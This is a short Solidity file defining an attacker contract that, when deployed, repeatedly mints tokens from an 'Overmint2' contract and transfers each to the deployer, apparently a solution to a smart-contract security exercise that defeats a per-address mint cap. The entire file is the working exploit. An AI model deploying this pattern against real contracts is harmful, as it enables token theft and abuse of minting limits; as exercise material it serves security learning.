// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint2.sol";

contract Overmint2Attacker {
    Overmint2 public victim;

    constructor(address _victim) {
        victim = Overmint2(_victim);
        attack();
    }

    function attack() public {
        for (uint i = 1; i <= 5; i++) {
            victim.mint();
            victim.transferFrom(address(this), msg.sender, i);
        }
    }
}
